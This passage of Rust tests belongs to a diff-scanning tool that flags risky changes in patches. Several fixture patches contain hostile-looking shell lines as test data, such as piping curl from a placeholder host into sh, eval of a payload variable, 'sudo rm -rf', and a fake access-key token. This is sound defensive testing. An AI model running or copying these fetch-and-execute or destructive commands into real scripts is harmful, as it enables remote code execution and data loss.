                "@@ -0,0 +1,2 @@\n+//! Helpers.\n+/* /*\n@@ -2,0 +3,2 @@\n+ */ // */ {SPAWN}\n+pub fn k() {{}}\n"
            )),
            spawn(3)
        );
        assert_eq!(
            created(
                &format!(
                    "@@ -0,0 +1,2 @@\n+//! Helpers.\n+/* /*\n+ */ // */ {SPAWN}\n+pub fn k() {{}}\n"
                )
                .replace("+1,2", "+1,4")
            ),
            spawn(3)
        );
        assert_eq!(
            created(&format!(
                "@@ -0,0 +1,2 @@\n+//! Helpers.\n+/*\n@@ -2,0 +1,2 @@\n+// */ {SPAWN}\n+pub fn k() {{}}\n"
            )),
            spawn(1)
        );
        // The review of the port of the new scanner, LF-H-1 (`newfile-string-depth.patch`):
        // a string opened in the first hunk, whose text in the second holds a glob.
        assert_eq!(
            created(&format!(
                "@@ -0,0 +1,2 @@\n+//! Helpers.\n+pub const GLOB: &str = \"\n@@ -2,0 +3,2 @@\n+    crates/*/*/Cargo.toml\";\n+{SPAWN}\n"
            )),
            spawn(4)
        );
    }

    /// A hunk joined to another on the word of its old position is still read on its own:
    /// the position may be false, and then the hunk begins wherever its file has it. Here
    /// the second hunk says it stands straight after the first, and it is really a line
    /// added inside a comment further down.
    #[test]
    fn a_position_cannot_take_a_hunks_own_starts_away() {
        let file = parse(&format!(
            "--- a/src/lib.rs\n+++ b/src/lib.rs\n@@ -3,2 +3,3 @@\n fn a() {{}}\n+fn b() {{}}\n fn c() {{}}\n@@ -5,2 +6,3 @@\n prose of a comment\n+// */ {SPAWN} /*\n more prose\n"
        ))
        .unwrap()
        .remove(0);
        assert_eq!(texts(&file).len(), 3);
        assert_eq!(found(&file), [(S::ProcessSpawn, Basis::Lexical, 7)]);
    }

    /// Another language is read across a join too, and each joined hunk alone as before, so
    /// nothing the released version reported is lost.
    #[test]
    fn joined_hunks_of_another_language_are_read_together_and_alone() {
        let created = |second: &str| {
            signals(
                &unplaced(&format!(
                    "diff --git a/tool.py b/tool.py\nnew file mode 100644\n--- /dev/null\n+++ b/tool.py\n@@ -0,0 +1,1 @@\n+HELP = \"\"\"\n@@ -1,0 +2,1 @@\n{second}\n"
                ))
                .remove(0),
            )
        };
        // the docstring the first hunk opened ends on the second, and a call follows: read
        // alone, the second hunk has the call inside a string
        assert_eq!(created("+text \"\"\"; eval(x)"), [S::DynamicEval]);
        // text of that docstring that looks like a call: the join has it for text, the hunk
        // alone for code, as the released version did
        assert_eq!(created("+eval(x)"), [S::DynamicEval]);
    }

    /// The labels of one hunk are those the file's scan gives it, also for hunks that are
    /// read together; a hunk that is a text of its own is scanned alone, and
    /// [`joined_hunks`] names the others.
    #[test]
    fn a_hunks_labels_are_those_of_the_files_scan_joined_or_not() {
        let file = unplaced(
            "--- a/src/lib.rs\n+++ b/src/lib.rs\n@@ -3,2 +3,3 @@\n a\n+let n = 1;\n b\n@@ -20,2 +21,3 @@\n c\n d\n+pub fn evil(x: Option<u32>) -> u32 { x.unwrap\n@@ -21,0 +24,1 @@\n+() }\n@@ -21,0 +25,1 @@\n+unsafe { f() }\n",
        )
        .remove(0);
        let hunks = &file.patch_twin.hunks;
        let evidence = file_evidence(&file);
        for (index, hunk) in hunks.iter().enumerate() {
            let of_file: Vec<EvidenceSignal> = EvidenceSignal::ALL
                .into_iter()
                .filter(|signal| {
                    evidence
                        .iter()
                        .any(|e| e.hunk == hunk.id && e.signal == *signal)
                })
                .collect();
            assert_eq!(hunk_signals(&file, index), Some(of_file));
        }
        assert_eq!(hunk_signals(&file, 1), Some(vec![S::PanicPathAdded]));
        assert_eq!(hunk_signals(&file, 3), Some(vec![S::UnsafeAdded]));
        assert_eq!(joined_hunks(&file), [false, true, true, true]);
        assert_eq!(
            hunk_signals_alone(&file, 0, &FileKinds::of(&file)),
            Some(vec![])
        );
        assert_eq!(
            hunk_signals_alone(&file, 0, &FileKinds::of(&file)),
            hunk_signals(&file, 0)
        );
    }

    /// Sixth independent review, IR6-H-2, and the review of the port of the new scanner,
    /// LF-H-1: what a hunk carries over a line end, read from code, is the mark of a side
    /// that may have begun inside a string, wherever the side ends.
    #[test]
    fn a_side_that_carries_anything_over_a_line_end_is_read_from_inside_a_string_too() {
        // `snap2.patch` (made by `diff -U3`): `#[ignore]` added between two tests whose
        // expected output is a raw string over lines. Rounds 10 to 12 found it, round 13
        // did not: read from code the side ends in code.
        assert_eq!(
            found_in(
                "--- a/tests/snapshots.rs\n+++ b/tests/snapshots.rs\n@@ -15,6 +15,7 @@\n \"#);\n }\n \n+#[ignore]\n #[test]\n fn renders_a_large_value() {\n     check(538, r#\"\n"
            ),
            [(S::TestSkipped, Basis::Lexical, 18)]
        );
        // `oldstr-both.patch`: the old side, a test removed between two strings
        assert_eq!(
            found_in(
                "--- a/tests/t.rs\n+++ b/tests/t.rs\n@@ -40,5 +40,4 @@\n   the last line of a long string\";\n-#[test]\n fn t() { check(); }\n \n const S: &str = \"another\n"
            ),
            [(S::TestRemoved, Basis::Lexical, 41)]
        );
        // `strcmt.patch`: read from code the side ends inside a block comment (the text
        // `"/*"` of a string), not inside a string
        assert_eq!(
            found_in(
                "--- a/src/lib.rs\n+++ b/src/lib.rs\n@@ -4,4 +4,5 @@\n   --quiet   say less\n   --help    this text\n \";\n+pub fn evil() { let _open = \"/*\"; std::process::Command::new(\"sh\").status().ok(); }\n pub fn k() {}\n"
            ),
            [(S::ProcessSpawn, Basis::Lexical, 7)]
        );
        // `rawbs.patch`: a raw string whose text ends in a backslash. Read as an ordinary
        // string its closing quote is escaped; the reading from inside a raw string takes
        // no escapes, and its count of `#` is that of the first quote that has any.
        assert_eq!(
            found_in(&format!(
                "--- a/src/lib.rs\n+++ b/src/lib.rs\n@@ -2,5 +2,5 @@\n C:\\tools\\\n C:\\more\\\n C:\\other\\\n-C:\\last\\\"#;\n+C:\\last\\\"#; {SPAWN}\n pub fn k() {{}}\n"
            )),
            [(S::ProcessSpawn, Basis::Lexical, 5)]
        );
        // `glob-git.patch` (a plain `git diff`): the hunk begins inside a string whose text
        // holds `crates/*/*/Cargo.toml`. Read from code that is two comments opened and one
        // closed, and the rest of the hunk is comment. Release 0.8.3 reported the spawn
        // (its scanner ended a comment at the first `*/`); round 13 did not.
        assert_eq!(
            found_in(
                "--- a/src/main.rs\n+++ b/src/main.rs\n@@ -6,9 +6,15 @@ pub const PATTERNS: &str = \"\n     Cargo.lock\n     README.md\n     LICENSE\n+    crates/*/*/Cargo.toml\n     docs/README.md\n \";\n \n+pub fn run(cmd: &str) -> bool {\n+    std::process::Command::new(\"sh\").arg(\"-c\").arg(cmd).status().is_ok()\n+}\n+\n fn main() {\n     println!(\"patterns: {}\", PATTERNS.lines().count());\n+    println!(\"ran: {}\", run(\"echo SPAWNED\"));\n }\n"
            ),
            [(S::ProcessSpawn, Basis::Lexical, 14)]
        );
        // `apos-git.patch`: the same with apostrophes and a long escape in a raw string
        assert_eq!(
            found_in(
                "--- a/src/main.rs\n+++ b/src/main.rs\n@@ -8,8 +8,8 @@ pub const SCRIPT: &str = r#\"\n     set -eu\n     cd \"$1\"\n     make\n-    printf done\n-\"#; pub fn f() { g() }\n+    printf '\\t\"%s\\n' done\n+\"#; pub fn f() { unsafe { hint2::run(g) } }\n \n \n mod hint2 { pub unsafe fn run(f: fn()) { f() } }\n"
            ),
            [(S::UnsafeAdded, Basis::Lexical, 12)]
        );
    }

    /// The general answer to a start that is not known: do not guess it. A hunk that reaches
    /// the top of its file is read exactly, from code, with no further start, so a patch
    /// made with full context (`git diff -U<large>`) has no unknown start. The four
    /// constructions that no reading of a bare fragment covers (they are declared misses in
    /// the corpus, `evidence/independent-review-6-20261114`) are each found in their
    /// full-context form: `two-hunk-string`, `strcode`, `depth2` and the nested-depth file
    /// of review V3 round 13.
    #[test]
    fn a_hunk_that_reaches_the_top_of_its_file_has_no_unknown_start() {
        let full = |before: &[&str], added: &str, after: &[&str]| {
            let old = before.len() + after.len();
            let mut patch = format!(
                "--- a/src/lib.rs\n+++ b/src/lib.rs\n@@ -1,{old} +1,{} @@\n",
                old + 1
            );
            for line in before {
                let _ = writeln!(patch, " {line}");
            }
            let _ = writeln!(patch, "+{added}");
            for line in after {
                let _ = writeln!(patch, " {line}");
            }
            let file = parse(&patch).unwrap().remove(0);
            assert_eq!(
                texts(&file),
                [Text {
                    hunks: vec![0],
                    top: true
                }]
            );
            found(&file)
        };
        let spawn = |line: u32| vec![(S::ProcessSpawn, Basis::Lexical, line)];
        // two-hunk-string: a string opened far above, closed inside a line comment
        assert_eq!(
            full(
                &["pub fn a() {}", "pub const S: &str = \"", "pub fn b() {}"],
                &format!("// \"; {SPAWN}"),
                &["pub fn k() {}"]
            ),
            spawn(4)
        );
        // strcode: the closing line of a string, with a comment that balances the quotes
        assert_eq!(
            full(
                &["pub const HELP: &str = \"usage:", "  --help    this text"],
                &format!("\"; {SPAWN} // \""),
                &["pub fn k() {}"]
            ),
            spawn(3)
        );
        // depth2: two comments deep, `*/ // */`
        assert_eq!(
            full(
                &["pub fn a() {}", "/* /*", "pub fn b() {}"],
                &format!(" */ // */ {SPAWN}"),
                &["pub fn k() {}"]
            ),
            spawn(4)
        );
        // review V3 round 13, VD3R13-M-1: `// */ //`, then `// */ call /*`
        assert_eq!(
            full(
                &["fn before() {}", "/* outer", "/* inner", "// */ //"],
                &format!("// */ {SPAWN} /*"),
                &["*/", "fn main() { evil(); }"]
            ),
            spawn(5)
        );
    }

    /// Nothing release 0.8.3 reports is lost: every hunk of a Rust file is also read as
    /// that release read it ([`legacy_hits`]), whatever the other readings make of its text.
    /// Held on generated text built from what the two scanners read differently (block
    /// comments that nest, quotes, apostrophes, raw strings, line comments), as a created
    /// file and as a fragment, added and removed. (The fuzz target `rust_tokens` holds the
    /// same on arbitrary text.)
    #[test]
    fn nothing_the_released_version_reports_is_lost() {
        const PIECES: [&str; 24] = [
            "/*",
            "*/",
            "\"",
            "'",
            "//",
            "r#\"",
            "\"#",
            "\\",
            "\n",
            "\n",
            " ",
            "x",
            "unsafe",
            " unsafe { f() } ",
            "std::process::Command::new(\"sh\")",
            "reqwest::get(u)",
            "#[test]",
            "#[allow(dead_code)]",
            "fn t() {}",
            "b'",
            "/**/",
            "'a",
            "(",
            ")",
        ];
        let mut seed = 0x2026_1114_u64;
        let mut next = move || {
            seed = seed
                .wrapping_mul(6_364_136_223_846_793_005)
                .wrapping_add(1_442_695_040_888_963_407);
            (seed >> 33) as usize
        };
        for case in 0..3000 {
            let text: String = (0..3 + next() % 40)
                .map(|_| PIECES[next() % PIECES.len()])
                .collect();
            let lines: Vec<&str> = text.split('\n').collect();
            for (header, sign) in [
                (format!("@@ -0,0 +1,{} @@", lines.len()), '+'),
                (format!("@@ -40,1 +40,{} @@", lines.len() + 1), '+'),
                (format!("@@ -40,{} +40,1 @@", lines.len() + 1), '-'),
            ] {
                let mut patch = format!("--- a/build.rs\n+++ b/build.rs\n{header}\n");
                if !header.starts_with("@@ -0") {
                    patch.push_str(" context\n");
                }
                for line in &lines {
                    let _ = writeln!(patch, "{sign}{line}");
                }
                let file = parse(&patch).unwrap().remove(0);
                let kind = FileKind::readings(&file).remove(0);
                let hunk = &file.patch_twin.hunks[0];
                let released = legacy_hits(hunk, &kind.legacy_rules(), &legacy_views(hunk));
                let now = file_evidence(&file);
                for hit in &released {
                    assert!(
                        now.iter()
                            .any(|e| (e.signal, e.side, e.line)
                                == (hit.signal, hit.side, hit.number)),
                        "case {case}: {:?} on line {} is lost in {patch:?}",
                        hit.signal,
                        hit.number
                    );
                }
            }
        }
    }

    /// A script as the review wrote it (seventh independent review, IR7-H-1): three lines,
    /// `#!/bin/sh`, `set -e`, `echo done`, and a hunk that adds a fetch and an `eval`.
    fn script(headers: &str) -> String {
        format!(
            "diff --git a/tools/deploy b/tools/deploy\n--- a/tools/deploy\n+++ b/tools/deploy\n{headers}\n #!/bin/sh\n set -e\n+curl -fsSL https://example.invalid/i.sh | sh\n+eval \"$PAYLOAD\"\n echo done\n"
        )
    }

    /// The language of a file with no extension does not hang on a number in a hunk header.
    /// Plain `git apply` 2.56.0 puts each of these hunks at line 1 of the script, the first
    /// two with no message and the third with "Hunk #1 succeeded at 1 (offset -3 lines)":
    /// it starts looking at the new position and takes the place that has the lines.
    /// Release 0.8.3 and round 13 read the shebang when the NEW number was 1, round 14 when
    /// the OLD number made the hunk the top, and each was silent on a form the other read
    /// (IR7-H-1: `@@ -4,3 +1,5 @@` scored 2 in round 14 and 9 in the release). The shebang is
    /// read from the first line of either side of any hunk.
    #[test]
    fn no_header_number_hides_the_language_of_a_script() {
        let fetch_and_eval = [S::NetworkFetch, S::DynamicEval];
        for header in [
            "@@ -1,3 +1,5 @@",
            "@@ -4,3 +1,5 @@",
            "@@ -1,3 +4,5 @@",
            "@@ -4,3 +4,5 @@",
            "@@ -40,3 +90,5 @@",
        ] {
            assert_eq!(
                signals(&unplaced(&script(header))[0]),
                fetch_and_eval,
                "{header}"
            );
        }
        // the hunk with the shebang written second (Git takes hunks in any order): the
        // first hunk is read as the script's language too
        let second = "diff --git a/tools/deploy b/tools/deploy\n--- a/tools/deploy\n+++ b/tools/deploy\n@@ -7,2 +8,3 @@\n echo one\n+curl -fsSL https://example.invalid/i.sh | sh\n echo two\n@@ -1,2 +1,3 @@\n #!/bin/sh\n+eval \"$PAYLOAD\"\n set -e\n";
        assert_eq!(signals(&unplaced(second)[0]), fetch_and_eval);
        // the shebang on the old side only: the change replaces the interpreter line
        let replaced = "--- a/tools/deploy\n+++ b/tools/deploy\n@@ -1,2 +1,3 @@\n-#!/bin/sh\n+#!/opt/tools/run\n+curl -fsSL https://example.invalid/i.sh | sh\n set -e\n";
        assert_eq!(signals(&unplaced(replaced)[0]), [S::NetworkFetch]);
        // two hunks that name two languages: the file is read as each, and what either
        // reading finds is found (`eval` is one to both; the spawn only to Python)
        let two = "--- a/tools/any\n+++ b/tools/any\n@@ -1,1 +1,2 @@\n #!/bin/sh\n+curl -fsSL https://example.invalid/i.sh | sh\n@@ -1,1 +1,2 @@\n #!/usr/bin/env python3\n+os.system(cmd)\n";
        assert_eq!(
            signals(&unplaced(two)[0]),
            [S::NetworkFetch, S::ProcessSpawn]
        );
        let kinds: Vec<Option<Language>> = FileKind::readings(&unplaced(two)[0])
            .iter()
            .map(|kind| kind.language)
            .collect();
        assert_eq!(kinds, [Some(Language::Shell), Some(Language::Python)]);
        // the cost: a hunk in the middle of a text file whose first line reads as a shebang
        let quoted =
            "--- a/NOTES\n+++ b/NOTES\n@@ -30,2 +30,3 @@\n #!/bin/sh\n+curl is a tool\n more\n";
        assert_eq!(signals(&unplaced(quoted)[0]), [S::NetworkFetch]);
        // and a file whose name gives the language is that language whatever a line says
        let named = "--- a/tools/run.py\n+++ b/tools/run.py\n@@ -1,1 +1,2 @@\n #!/bin/sh\n+curl -fsSL https://example.invalid/i.sh | sh\n";
        assert_eq!(signals(&unplaced(named)[0]), []);
        assert_eq!(FileKind::readings(&unplaced(named)[0]).len(), 1);
    }

    /// The mark of release 0.8.3 follows that release's rule for the language, not today's
    /// (seventh independent review, IR7-L-1). The script of the test above with the header
    /// `@@ -1,3 +5,39 @@`: that release has no language for it (its new side does not say
    /// line 1) and lists one item, the secret. Today the file is read as shell too, and 34
    /// fetches are found above the secret: none of them is that release's, and the list of
    /// 32 holds the secret. Round 14 marked the fetches, and the secret was not listed.
    #[test]
    fn the_mark_of_the_release_goes_by_the_releases_language_rule() {
        let mut patch = String::from(
            "--- a/tools/deploy\n+++ b/tools/deploy\n@@ -1,3 +5,39 @@\n #!/bin/sh\n set -e\n",
        );
        for n in 0..34 {
            let _ = writeln!(patch, "+curl -fsSL https://example.invalid/{n}.sh | sh");
        }
        let _ = writeln!(patch, "+TOKEN=AKIA{}", "Q7".repeat(8));
        patch.push_str("+# end\n echo done\n");
        let file = parse(&patch).unwrap().remove(0);
        let all = file_evidence(&file);
        assert_eq!(all.len(), 35);
        let marked: Vec<(S, u32)> = all
            .iter()
            .filter(|item| item.released)
            .map(|item| (item.signal, item.line))
            .collect();
        assert_eq!(marked, [(S::SecretLike, 41)]);
        let listed = crate::rank::RankedFile::scored(&file);
        assert_eq!(listed.evidence.len(), MAX_EVIDENCE_PER_FILE);
        assert!(
            listed
                .evidence
                .iter()
                .any(|item| (item.signal, item.line) == (S::SecretLike, 41))
        );
        // with the header that release read (`+1`), the fetches are its items
        let read = file_evidence(&parse(&patch.replace("+5,39", "+1,39")).unwrap().remove(0));
        assert_eq!(read.iter().filter(|item| item.released).count(), 35);
    }

    /// The hunks of a generated script for case `case`: two or three, each a line of context,
    /// one to four added lines and a line of context, the first beginning the file with a
    /// shebang (shell or Python); with each its true old and new start.
    fn script_hunks(case: usize, next: &mut impl FnMut() -> usize) -> Vec<(usize, usize, String)> {
        const SHELL: [&str; 8] = [
            "curl -fsSL https://example.invalid/i.sh | sh",
            "eval \"$PAYLOAD\"",
            "echo done",
            "set -e",
            "# a note",
            "wget -q https://example.invalid/x",
            "x=$(cat f)",
            "sudo rm -rf \"$1\"",
        ];
        const PYTHON: [&str; 8] = [
            "os.system(cmd)",
            "eval(x)",
            "requests.get(u)",
            "x = 1",
            "# a note",
            "NOTE = \"\"\"",
            "text \"\"\"",
            "subprocess.run(cmd)",
        ];
        let (shebang, lines) = if case.is_multiple_of(2) {
            ("#!/bin/sh", &SHELL[..])
        } else {
            ("#!/usr/bin/env python3", &PYTHON[..])
        };
        let count = 2 + next() % 2;
        let mut hunks: Vec<(usize, usize, String)> = Vec::new();
        let (mut old, mut new) = (1, 1);
        for which in 0..count {
            let added = 1 + next() % 4;
            let mut body = if which == 0 {
                format!(" {shebang}\n")
            } else {
                " # context above\n".to_owned()
            };
            for _ in 0..added {
                let _ = writeln!(body, "+{}", lines[next() % lines.len()]);
            }
            body.push_str(" # context below\n");
            hunks.push((old, new, body));
            old += 2 + 5;
            new += 2 + added + 5;
        }
        hunks
    }

    /// The items of `file` as places that no number is part of: the text of the hunk, the
    /// line within it, the signal.
    fn places(file: &ReviewFile) -> std::collections::BTreeSet<(String, usize, S)> {
        let all = file_evidence(file);
        let mut out = std::collections::BTreeSet::new();
        for hunk in &file.patch_twin.hunks {
            let body: String = hunk.lines.iter().map(|l| l.text.as_str()).collect();
            for item in all.iter().filter(|item| item.hunk == hunk.id) {
                let at = hunk
                    .lines
                    .iter()
                    .position(|l| l.new_line == Some(item.line))
                    .unwrap();
                out.insert((body.clone(), at, item.signal));
            }
        }
        out
    }

    /// No number in a header takes away an item that release 0.8.3 reports, in a file with
    /// no extension as in any other: generated scripts (shell and Python by their shebang),
    /// cut into hunks with context around each change, with the true numbers, with every
    /// number replaced by one the generator picks, and with the hunks in another order.
    /// Held: what that release finds in each hunk under ITS rule for the language is found
    /// and is what is marked; and whatever the true numbers give is given under any others
    /// (the floor property had no file without an extension and no false number in it:
    /// IR7-L-4).
    #[test]
    fn false_numbers_take_nothing_away_from_a_script() {
        let mut seed = 0x2026_1115_0007_u64;
        let mut next = move || {
            seed = seed
                .wrapping_mul(6_364_136_223_846_793_005)
                .wrapping_add(1_442_695_040_888_963_407);
            (seed >> 33) as usize
        };
        let (mut found_more, mut silent_before) = (0, 0);
        for case in 0..600 {
            let hunks = script_hunks(case, &mut next);
            let count = hunks.len();
            let patch = |numbers: &dyn Fn(usize, usize) -> (usize, usize), order: &[usize]| {
                let mut text = "--- a/tools/job\n+++ b/tools/job\n".to_owned();
                for index in order {
                    let (old, new, body) = &hunks[*index];
                    let (old, new) = numbers(*old, *new);
                    let rows = body.lines().count();
                    let added = body.lines().filter(|line| line.starts_with('+')).count();
                    let _ = write!(text, "@@ -{old},{} +{new},{rows} @@\n{body}", rows - added);
                }
                parse(&text).unwrap().remove(0)
            };
            let in_order: Vec<usize> = (0..count).collect();
            let honest = patch(&|old, new| (old, new), &in_order);
            let (shift_old, shift_new) = (next() % 50, next() % 50);
            let reversed: Vec<usize> = in_order.iter().rev().copied().collect();
            for (file, what) in [
                (
                    patch(&|old, new| (old + shift_old, new + shift_new), &in_order),
                    "shifted",
                ),
                (patch(&|old, _| (old + 3, 1), &in_order), "new 1"),
                (patch(&|_, new| (2, new + 3), &in_order), "old 2"),
                (patch(&|old, new| (old, new), &reversed), "reversed"),
                (
                    patch(&|old, new| (old + shift_old, new + shift_new), &reversed),
                    "both",
                ),
            ] {
                // what the true numbers give is given under any others
                let given = places(&file);
                for item in places(&honest) {
                    assert!(given.contains(&item), "case {case} {what}: {item:?}");
                }
                // what that release finds under its rule is found, and is what is marked
                let key = |item: &Evidence| (item.hunk, item.side, item.signal, item.line);
                let all = file_evidence(&file);
                let released = listed_by_release_0_8_3(&file);
                let marked: Vec<_> = all.iter().filter(|item| item.released).map(key).collect();
                assert_eq!(marked, released, "case {case} {what}");
                found_more += usize::from(all.len() > released.len());
                silent_before += usize::from(released.is_empty() && !all.is_empty());
            }
        }
        // the cases are of the kind that matters: files that release read as no language
        assert!(
            found_more > 500 && silent_before > 500,
            "{found_more} {silent_before}"
        );
    }

    /// A hunk that is a text of its own is read alone at the cost of that hunk: with the
    /// kinds of its file handed in ([`FileKinds`]) the reader makes no pass over the file,
    /// and what it gives is what the scan of the file gives that hunk (eighth independent
    /// review, IR8-M-2: round 15 worked the kinds out for each hunk, a pass over every hunk
    /// of a file with no extension, and nothing but the views called this function, so no
    /// test and no fuzz target saw it). Generated scripts with no extension, with true
    /// numbers and false ones.
    #[test]
    fn a_hunk_alone_is_read_with_no_pass_over_its_file_and_as_the_scan_reads_it() {
        let mut seed = 0x2026_1115_0009_u64;
        let mut next = move || {
            seed = seed
                .wrapping_mul(6_364_136_223_846_793_005)
                .wrapping_add(1_442_695_040_888_963_407);
            (seed >> 33) as usize
        };
        let (mut alone, mut with_evidence) = (0, 0);
        for case in 0..400 {
            let hunks = script_hunks(case, &mut next);
            let shift = if case % 3 == 0 { 0 } else { next() % 40 };
            let mut text = "--- a/tools/job\n+++ b/tools/job\n".to_owned();
            for (old, new, body) in &hunks {
                let rows = body.lines().count();
                let added = body.lines().filter(|line| line.starts_with('+')).count();
                let _ = write!(
                    text,
                    "@@ -{},{} +{},{rows} @@\n{body}",
                    old + shift,
                    rows - added,
                    new + shift
                );
            }
            let file = parse(&text).unwrap().remove(0);
            let joined = joined_hunks(&file);
            let whole = file_evidence(&file);
            let kinds = FileKinds::of(&file);
            let before = file_walks();
            for (index, hunk) in file.patch_twin.hunks.iter().enumerate() {
                if joined[index] {
                    continue;
                }
                let found = hunk_signals_alone(&file, index, &kinds).unwrap();
                let scanned: Vec<S> = S::ALL
                    .into_iter()
                    .filter(|signal| {
                        whole
                            .iter()
                            .any(|item| item.hunk == hunk.id && item.signal == *signal)
                    })
                    .collect();
                assert_eq!(found, scanned, "case {case}, hunk {index}:\n{text}");
                alone += 1;
                with_evidence += usize::from(!found.is_empty());
            }
            assert_eq!(file_walks(), before, "case {case}");
            assert_eq!(hunk_signals_alone(&file, hunks.len(), &kinds), None);
        }
        assert!(
            alone > 800 && with_evidence > 400,
            "{alone} {with_evidence}"
        );
    }

    /// The model of `git apply` that the joins on a hint rest on, and both hints (seventh
    /// independent review, IR7-L-3 and IR7-M-2). Plain `git apply` 2.56.0 and
    /// `git apply --unidiff-zero`, in scratch repositories:
    ///
    /// - A hunk of added lines only, `@@ -5,0 +6,1 @@`, on a file of 14 lines: plain Git,
    ///   "Hunk #1 succeeded at 15 (offset 9 lines)" (the end of the file); with
    ///   `--unidiff-zero`, line 6. The same with `@@ -5,0 +1,1 @@` and `--unidiff-zero`:
    ///   line 1. There the NEW number places a hunk that has no old line.
    /// - `@@ -2,0 +3,1 @@` and then `@@ -3,1 +4,1 @@` with true numbers (the review's
    ///   `pq.patch`): plain Git refuses (it wants the first at the end), `--unidiff-zero`
    ///   applies, and the added line and the changed line stand together.
    /// - Two hunks with context that touch, the second written `@@ -40,2 +5,3 @@` (the
    ///   review's `cutpair.patch`): accepted with no message; its new number is true.
    ///
    /// So hunks are read together when their old numbers say they touch and when their new
    /// numbers do, and a hunk with no line on a side counts on that side as standing after
    /// the line it names, before another hunk as after one.
    #[test]
    fn hunks_are_joined_on_the_hint_of_either_number() {
        let text = |hunks: &[usize]| Text {
            hunks: hunks.to_vec(),
            top: false,
        };
        let existing =
            |hunks: &str| unplaced(&format!("--- a/src/m.rs\n+++ b/src/m.rs\n{hunks}")).remove(0);
        let call = [(S::PanicPathAdded, Basis::Hunk, 3)];
        // `pq.patch`: a hunk with no old line, then the hunk at the next old line. (Plain
        // Git would put the first at the end; that is the hunk alone.) Round 14 joined the
        // pair only in the other order.
        let pq = existing(
            "@@ -2,0 +3,1 @@\n+    let v = opt.unwrap\n@@ -3,1 +4,1 @@\n-    let b = 2;\n+    (); let b = v;\n",
        );
        assert_eq!(texts(&pq), [text(&[0]), text(&[1]), text(&[0, 1])]);
        assert_eq!(found(&pq), call);
        let qp = existing(
            "@@ -3,1 +4,1 @@\n-    let b = 2;\n+    (); let b = v;\n@@ -2,0 +3,1 @@\n+    let v = opt.unwrap\n",
        );
        // The same two written the other way round. Plain Git must put the second at the
        // end, after the first (one text), and by the numbers the second stands before the
        // first (another): each is read, and the second finds the call.
        assert_eq!(
            texts(&qp),
            [text(&[0]), text(&[1]), text(&[0, 1]), text(&[1, 0])]
        );
        assert_eq!(found(&qp), call);
        // `cutpair.patch`: the old number of the second hunk is false, the new one true
        let cut = |second: &str| {
            existing(&format!(
                "@@ -1,2 +1,3 @@\n pub fn f(opt: Option<u32>) -> u32 {{\n+    let v = opt.unwrap\n \n{second}\n     ();\n+    let w = v;\n     w\n"
            ))
        };
        let top = |hunks: &[usize]| Text {
            hunks: hunks.to_vec(),
            top: true,
        };
        for second in ["@@ -3,2 +4,3 @@", "@@ -40,2 +4,3 @@", "@@ -3,2 +50,3 @@"] {
            let file = cut(second);
            assert_eq!(
                texts(&file),
                [top(&[0]), text(&[1]), top(&[0, 1])],
                "{second}"
            );
            assert_eq!(
                found(&file),
                [(S::PanicPathAdded, Basis::Hunk, 2)],
                "{second}"
            );
        }
        // both numbers false: nothing says they touch, and the join does not find the call
        // (what stands at the edge of each half is another rule's matter)
        assert_eq!(texts(&cut("@@ -40,2 +50,3 @@")), [top(&[0]), text(&[1])]);
        // a hunk with no line on a side counts on that side as an earlier hunk: with the
        // other number false, the pair is joined by that side alone (old: the added line
        // stands after old line 2 and the second begins at old line 3; new: the removed
        // line stands after new line 4 and the second begins at new line 5)
        let by_old = existing(
            "@@ -2,0 +3,1 @@\n+    let v = f(\n@@ -3,1 +44,1 @@\n-    let b = 2;\n+    g());\n",
        );
        assert_eq!(texts(&by_old), [text(&[0]), text(&[1]), text(&[0, 1])]);
        let by_new =
            existing("@@ -5,1 +4,0 @@\n-    gone();\n@@ -90,1 +5,2 @@\n l90\n+    here();\n");
        assert_eq!(texts(&by_new), [text(&[0]), text(&[1]), text(&[0, 1])]);
        // the two numbers name two different hunks: the hunk stands in a run for each, four
        // texts at most
        let both = existing(
            "@@ -3,2 +3,3 @@\n l3\n+a\n l4\n@@ -13,2 +14,3 @@\n l13\n+b\n l14\n@@ -5,2 +17,3 @@\n l5\n+c\n l6\n",
        );
        assert_eq!(
            texts(&both),
            [
                text(&[0]),
                text(&[1]),
                text(&[2]),
                text(&[0, 2]),
                text(&[1, 2])
            ]
        );
        // a hunk that removes lines and has no new line says the new line it stands after
        let removed = existing("@@ -3,2 +3,3 @@\n l3\n+a\n l4\n@@ -9,1 +5,0 @@\n-gone\n");
        assert_eq!(texts(&removed), [text(&[0]), text(&[1]), text(&[0, 1])]);
    }

    /// The constructs the token reader knows, their tokens apart, each with its signal and
    /// whether it is read on added lines (else on removed ones).
    const CUT_CONSTRUCTS: [(S, bool, &str); 28] = [
        (S::PanicPathAdded, true, "let v = x . unwrap ( ) ;"),
        (S::PanicPathAdded, true, "let v = x . expect ( msg ) ;"),
        (S::PanicPathAdded, true, "let v = Option :: unwrap ( x ) ;"),
        (
            S::PanicPathAdded,
            true,
            "let v = x . unwrap :: < u8 > ( ) ;",
        ),
        (
            S::PanicPathAdded,
            true,
            "let v = it . map ( Option :: unwrap ) ;",
        ),
        (
            S::PanicPathAdded,
            true,
            "let v = it . map ( Result :: < u8 , E > :: unwrap ) ;",
        ),
        (S::StubAdded, true, "todo ! ( ) ;"),
        (S::StubAdded, true, "unimplemented ! ( ) ;"),
        (S::TrivialAssert, true, "assert ! ( true ) ;"),
        (S::TrivialAssert, true, "assert_eq ! ( true , true ) ;"),
        (S::TrivialAssert, true, "debug_assert ! ( true , msg ) ;"),
        (S::TestSkipped, true, "# [ ignore ] fn t ( ) { }"),
        (S::TestSkipped, true, "# [ ignore = why ] fn t ( ) { }"),
        (S::TestSkipped, true, "# ! [ ignore ]"),
        (
            S::TestSkipped,
            true,
            "# [ cfg_attr ( miri , ignore ) ] fn t ( ) { }",
        ),
        (
            S::CheckSuppressed,
            true,
            "# [ allow ( dead_code ) ] fn t ( ) { }",
        ),
        (S::CheckSuppressed, true, "# ! [ allow ( unused ) ]"),
        (
            S::ProcessSpawn,
            true,
            "let c = std :: process :: Command :: new ( sh ) ;",
        ),
        (S::ProcessSpawn, true, "let c = Command :: new ( sh ) ;"),
        (S::ProcessSpawn, true, "fn f ( c : process :: Command ) { }"),
        (S::NetworkFetch, true, "let r = reqwest :: get ( u ) ;"),
        (S::NetworkFetch, true, "let r = ureq :: get ( u ) ;"),
        (
            S::NetworkFetch,
            true,
            "let s = TcpStream :: connect ( a ) ;",
        ),
        (S::NetworkFetch, true, "let s = UdpSocket :: bind ( a ) ;"),
        (S::TestRemoved, false, "# [ test ] fn t ( ) { }"),
        (
            S::TestRemoved,
            false,
            "# [ tokio :: test ] async fn t ( ) { }",
        ),
